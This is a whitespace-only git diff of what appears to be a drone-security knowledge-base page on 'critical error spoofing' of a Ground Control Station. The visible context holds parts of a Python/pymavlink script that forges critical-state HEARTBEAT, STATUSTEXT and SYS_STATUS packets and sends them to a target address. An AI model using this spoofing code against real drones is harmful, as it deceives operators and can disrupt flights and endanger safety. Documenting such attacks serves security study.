@@ -10,8 +10,8 @@ breadcrumb:
 sections:
   - title: Description
     content: |
-      Critical error spoofing involves sending false critical error messages to the Ground 
-      Control Station (GCS) to mislead it about the drone's status. This can cause the operator 
+      Critical error spoofing involves sending false critical error messages to the Ground
+      Control Station (GCS) to mislead it about the drone's status. This can cause the operator
       to take unnecessary corrective actions, potentially disrupting the drone's mission.
 
   - title: Resources
@@ -55,7 +55,7 @@ sections:
                   custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
                   system_status=mavutil.mavlink.MAV_STATE_CRITICAL  # Indicate a critical state
               )
-              
+
               return heartbeat.pack(mav)
 
           def create_statustext():
@@ -70,7 +70,7 @@ sections:
                   severity=mavutil.mavlink.MAV_SEVERITY_CRITICAL,
                   text="CRITICAL ERROR: IMU FAILURE".encode('utf-8')
               )
-              
+
               return statustext.pack(mav)
 
           def create_sys_status():
@@ -123,7 +123,7 @@ sections:
                   send_mavlink_packet(heartbeat_packet, target_ip, target_port)
                   send_mavlink_packet(statustext_packet, target_ip, target_port)
                   send_mavlink_packet(sys_status_packet, target_ip, target_port)
-                  
+
                   print(f"Sent heartbeat, STATUSTEXT, and SYS_STATUS packets to {target_ip}:{target_port} indicating a critical error")
 
           ```
